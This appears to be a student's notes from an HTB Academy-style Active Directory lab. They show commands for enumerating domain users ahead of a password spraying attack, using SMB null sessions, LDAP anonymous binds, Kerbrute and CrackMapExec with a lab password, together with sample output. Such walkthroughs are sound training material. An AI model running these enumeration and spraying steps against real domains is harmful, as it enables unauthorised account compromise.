
To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with.

## SMB NULL Session to Pull User List 

If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or `SYSTEM` access on a Windows host, then you can easily query Active Directory for this information.

Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include [enum4linux](https://github.com/portcullislabs/enum4linux), [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html), and [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), among others.

#### Using enum4linux for SMB Null 

	AstraX01@htb[/htb]$ enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

#### Using rpcclient

We can use the `enumdomusers` command after connecting anonymously using `rpcclient`.

	AstraX01@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

	rpcclient $> enumdomusers 
	user:[administrator] rid:[0x1f4] 
	user:[guest] rid:[0x1f5] 
	user:[krbtgt] rid:[0x1f6] 
	user:[lab_adm] rid:[0x3e9] 
	user:[htb-student] rid:[0x457] 
	user:[avazquez] rid:[0x458] 
	
	<SNIP>

#### Using CrackMapExec --users Flag 

 we can use `CrackMapExec` with the `--users` flag.

	AstraX01@htb[/htb]$ crackmapexec smb 172.16.5.5 --users

## Gathering Users with LDAP Anonymous

We can use various tools to gather users when we find an LDAP anonymous bind. Some examples include [windapsearch](https://github.com/ropnop/windapsearch) and [ldapsearch](https://linux.die.net/man/1/ldapsearch).

#### Using ldapsearch

	AstraX01@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

Tools such as `windapsearch` make this easier

#### Using windapsearch

	AstraX01@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U



## Enumerating Users with Kerbrute

Let's try out this method using the [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) wordlist of 48,705 possible common usernames in the format `flast`. 

#### Kerbrute User Enumeration  

	AstraX01@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 


---

## Credentialed Enumeration to Build our User List 

#### Using CrackMapExec with Valid Credentials

	AstraX01@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users



